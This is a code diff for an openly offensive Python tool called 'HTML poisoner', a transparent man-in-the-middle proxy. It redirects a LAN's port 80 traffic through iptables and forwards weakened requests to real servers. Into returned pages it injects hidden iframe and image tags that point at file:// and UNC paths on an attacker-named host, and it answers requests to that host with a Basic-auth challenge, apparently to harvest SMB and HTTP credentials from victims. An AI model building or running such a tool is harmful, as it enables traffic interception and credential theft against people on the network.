@@ -32,6 +32,7 @@ TESTING_FILE_TxResponse = 'HTMLpoisoner.TXres.raw'
 from thread import *
 from utils import *
 from datetime import datetime
+from select import select
 
 def closeTxAndRx(RxConnection, TxConnection, RxConnNum):
     TxConnection.close()
@@ -43,40 +44,48 @@ def closeTxAndRx(RxConnection, TxConnection, RxConnNum):
 
 
 # handle inbound connections in new thread
-def connectionHandler(RxConnection, RxRequest, RxConnNum):
-    RxHeaders = getRxReqHeaders(RxRequest, RxConnNum)
-    # if HTTPHeaders is not a dictionary, it probably isn't an HTTP request so send the banner
-    if RxHeaders == False:
-        sendBanner(RxConnection, RxConnNum)
-    else:
-        TxConnectionString = getConnectionString(RxHeaders, RxConnNum)
-        if TxConnectionString != False:
+def connectionHandler(RxConnection, RxConnNum):
+    # receive data from the RxSocket
+    RxRequest = receiveRxReq(RxConnection, RxConnNum)
+    # if an error is detected on RxConnection, don't process any further
+    if RxRequest != False:
+        # extract the headers from the request
+        RxHeaders = getRxReqHeaders(RxRequest, RxConnNum)
+        # if HTTPHeaders is not a dictionary, it probably isn't an HTTP request so send the banner
+        if RxHeaders != False:
+            TxConnectionString = getConnectionString(RxHeaders, RxConnNum)
+            if TxConnectionString != False:
+                # sometimes get HTTP requests to the inject host name, lets exploit this as well as SMB
+                if re.search(r'^htmlinject.*', TxConnectionString['host']) is not None:
+                    printMsg(RxConnNum, 'HTTP Request received for inject domain')
+                    RxResponse = '401 Unauthorized\r\nWWW-Authenticate: Basic'
+                    RxConnection.close()
+                else:
+                    # make URI formatted for error handling
+                    if '?' in TxConnectionString['URI']:
+                        TxFileRequested = TxConnectionString['URI'].split('?')[0][-20:]
+                    else:
+                        TxFileRequested = TxConnectionString['URI'][-20:]
 
-            # make URI formatted for error handling
-            if '?' in TxConnectionString['URI']:
-                TxFileRequested = TxConnectionString['URI'].split('?')[0][-20:]
+                    TxRequest = weakenRxRequest(RxRequest, RxConnNum, TxConnectionString['transport'] + '://' + TxConnectionString['host'] + ':' + str(TxConnectionString['port']) + ' + last chars of file ' + TxFileRequested)
+
+                    # Connect to real web server
+                    TxConnection = createTxConnection(TxConnectionString, RxConnNum)
+                    # Send data to real web server if connection to server was possible
+                    if TxConnection != False:
+                        if sendData(TxConnection, TxRequest, 'TxRequest', RxConnNum) == False:
+                            return
+                        # hand over processing to the correct function
+                        receiveTxResponse(TxConnection, RxConnection, RxConnNum)
+                    elif TESTING:
+                        printMsg(RxConnNum, 'No TxSocket to work with')
             else:
-                TxFileRequested = TxConnectionString['URI'][-20:]
-
-            TxRequest = weakenRxRequest(RxRequest, RxConnNum, TxConnectionString['transport'] + '://' + TxConnectionString['host'] + ':' + str(TxConnectionString['port']) + ' + last chars of file ' + TxFileRequested)
-
-            # Connect to real web server
-            TxConnection = createTxConnection(TxConnectionString, RxConnNum)
-            # Send data to real web server if connection to server was possible
-            if TxConnection != False:
-                if sendData(TxConnection, TxRequest, 'TxRequest', RxConnNum) == False:
-                    return
-                # hand over processing to the correct function
-                receiveTxResponse(TxConnection, RxConnection, RxConnNum)
-            elif TESTING:
-                printMsg(RxConnNum, 'No TxSocket to work with')
-        else:
-            # if we haven't been able to establish a valid connection string, don't do anything else
-            if TESTING:
-                printMsg(RxConnNum, 'Incomplete connection string: ' + str(TxConnectionString))
-            RxConnection.close()
-            if VERBOSE:
-                printMsg(RxConnNum, 'RXConnection Closed')
+                # if we haven't been able to establish a valid connection string, don't do anything else
+                if TESTING:
+                    printMsg(RxConnNum, 'Incomplete connection string: ' + str(TxConnectionString))
+                RxConnection.close()
+                if VERBOSE:
+                    printMsg(RxConnNum, 'RXConnection Closed')
 
 
 # create a listening socket to receive victim requests
@@ -185,6 +194,14 @@ def getConnectionString(RxHeaders, RxConnNum):
     return False
 
 
+# extract the Rx Request body
+def getRxReqBody(RxRequest):
+    # Split out the data section from the headers / preamble
+    HTTPData = RxRequest.split("\r\n\r\n", 1)
+    # Split each line
+    return HTTPData[1]
+
+
 # extract the Rx Request headers
 def getRxReqHeaders(RxRequest, RxConnNum):
     # Split out the data section from the headers / preamble
@@ -197,14 +214,19 @@ def getRxReqHeaders(RxRequest, RxConnNum):
         # The rest are colon separated headers and can be turned into a dictionary
         headerIndex = 0
         for header in HTTPHeadersList:
+            # don't play with the first line as this has a different format to the rest of the headers
             if headerIndex > 0:
+                # split the line into the key and the vaue
                 headerParts = header.split(":", 1)
+                # add the key and value to the headers dictionary
                 HTTPHeadersDict[headerParts[0]] = str(headerParts[1]).replace(' ', '')
             headerIndex += 1
         if VERBOSETESTING:
             printMsg(RxConnNum, 'Headers: '+str(HTTPHeadersDict))
         return HTTPHeadersDict
     except IndexError:
+        if TESTING:
+            printMsg(RxConnNum, 'Index error with headers: '+str(RxRequest))
         return False
 
 
@@ -228,7 +250,8 @@ def getTxResContentType(TxResHeaders, RxConnNum):
             printMsg(RxConnNum, 'Content type is ' + contentType)
         return contentType
     else:
-        printMsg(RxConnNum, 'No content type detected')
+        if TESTING:
+            printMsg(RxConnNum, 'No TxRes content type detected')
         return 'Undetectable content type'
 
 
@@ -268,7 +291,8 @@ def getTxResReportedContentLength(TxResponseHeaders, RxConnNum):
             printMsg(RxConnNum, 'Content length is ' + contentLength)
         return contentLength
     else:
-        printMsg(RxConnNum, 'No content length detected')
+        if TESTING:
+            printMsg(RxConnNum, 'No TxRes content length detected')
         return False
 
 
@@ -323,6 +347,7 @@ def main():
     logCleanup()
     # create the lsitening socket for the transparent proxy
     RxSocket = createRxSocket(HOST, PORT)
+    RxSocket.setblocking(0)
     # once the receiving socket is setup, change the IPTABLES rules to redirect port 80 to the transparent proxy
     os.system('iptables -A PREROUTING -t nat -i br-lan -p tcp --dport 80 -j REDIRECT --to-port 3128')
     # detect if DNSSpoof is already running
@@ -338,19 +363,17 @@ def main():
 
     # always try and keep a socket listening
     while True:
-        # allow connections to be made to the Rx socket
-        RxConnection, RxAddress = RxSocket.accept()
-        # print connection details to screen to show activity
-        if TESTING:
-            printMsg(RxConnNum, 'Connection from: ' + RxAddress[0] + ":" + str(RxAddress[1]))
-        # receive data from the RxSocket
-        RxRequest = receiveRxReq(RxConnection, RxConnNum)
-        # if an error is detected on RxConnection, don't process any further
-        if RxRequest != False:
-            # when new connections are received, spawn a new thread to handle it
-            start_new_thread(connectionHandler, (RxConnection, RxRequest, RxConnNum))
+        RxSocketReady = select([RxSocket], [], [], SOCKET_TIMEOUT)
+        if RxSocketReady[0]:
+            # allow connections to be made to the Rx socket
+            RxConnection, RxAddress = RxSocket.accept()
             # increment connection counter (for bug hunting)
             RxConnNum += 1
+            # print connection details to screen to show activity
+            if TESTING:
+                printMsg(RxConnNum, 'Connection from: ' + RxAddress[0] + ":" + str(RxAddress[1]))
+            # when new connections are received, spawn a new thread to handle it
+            start_new_thread(connectionHandler, (RxConnection, RxConnNum))
 
 
 # calculate and insert new content length
@@ -371,10 +394,10 @@ def poisonRxResponse(TxResponse, RxConnNum):
     IntermediateResponse = TxResponse
     # inject new tag if lowercase "<body>" tag is found
     if '</body>' in IntermediateResponse:
-        IntermediateResponse = IntermediateResponse.replace('</body>','<img src="file://htmlinject/share/random.jpg" alt="" /></body>')
+        IntermediateResponse = IntermediateResponse.replace('</body>',' <iframe src="http://htmlinject/"></iframe><img src="file://htmlinject/share/random.jpg" alt="" /><img src="\\\\htmlinject\\share\\notsorandom.jpg" alt="" /></body>')
     # inject new tag if uppercase "<body>" tag is found
     if '</BODY>' in IntermediateResponse:
-        IntermediateResponse = IntermediateResponse.replace('</BODY>','<IMG SRC="file://htmlinject/share/random.jpg" ALT="" /></BODY>')
+        IntermediateResponse = IntermediateResponse.replace('</BODY>','<iframe src="http://htmlinject/"></iframe><IMG SRC="file://htmlinject/share/random.jpg" ALT="" /><IMG SRC="\\\\htmlinject\\share\\notsorandom.jpg" ALT="" /></BODY>')
 
     RxResponse = IntermediateResponse
 
@@ -399,6 +422,7 @@ def receiveRxReq(connection, RxConnNum):
         loopIndex += 1
         if loopIndex == 499:
             printMsg(RxConnNum, 'Maximum RxReq loop detected')
+            return False
         try:
             data = connection.recv(BUFFER_SIZE)
             if TESTING:
@@ -409,9 +433,14 @@ def receiveRxReq(connection, RxConnNum):
 
             wholeRxReqData = wholeRxReqData + data
 
-            if "\r\n\r\n" in data:
+            # if the end of the whole request that doesn't contain any request body
+            if re.findall(r"\r\n\r\n\Z", wholeRxReqData, re.MULTILINE):
                 break
-            elif len(data) == 0:
+            # if data ends in a zero and two empty lines
+            if ('\r\n0\r\n\r\n' in wholeRxReqData):
+                break
+            # if the last transmission from the potential victim is of zero length
+            if len(data) == 0:
                 break
 
         except socket.timeout as errMsg:
@@ -444,8 +473,8 @@ def receiveTxResponse(TxConnection, RxConnection, RxConnNum):
 
 
     #effectively this is a "while True", however, build in a hard limit to help ensure no process or thread hangs
-    while TCPchunkID < 500:
-        if TCPchunkID == 499:
+    while TCPchunkID < 5000:
+        if TCPchunkID == 4999:
             printMsg(RxConnNum, 'Maximum TxRes loop detected')
             break
         # get TxResponse
@@ -539,13 +568,6 @@ def receiveTxResponse(TxConnection, RxConnection, RxConnNum):
 
     closeTxAndRx(RxConnection, TxConnection, RxConnNum)
 
-# when not a HTTP connection send banner back to user
-def sendBanner(connection, RxConnNum):
-    connection.send('The HTML Poisoner at your service ma\'am...')
-    if TESTING:
-        # xxx print colour
-        print color('RxC=' + str(RxConnNum) + ':::[!]Irrelevant connection detected: service banner sent')
-
 
 # send data, check for errors
 def sendData(connection, dataToSend, dataType, RxConnNum, NotifyUser = False):
@@ -558,6 +580,7 @@ def sendData(connection, dataToSend, dataType, RxConnNum, NotifyUser = False):
         if NotifyUser == True:
             printMsg(RxConnNum, dataType + ' socket error: ' + str(errMsg))
         return False
+
 
 # sub-handler for when no maleable Tx response is detected
 def storeAndForward(TxResChunk, RxConnection, TCPchunkID, NotifiedUserRxResSent, RxConnNum):
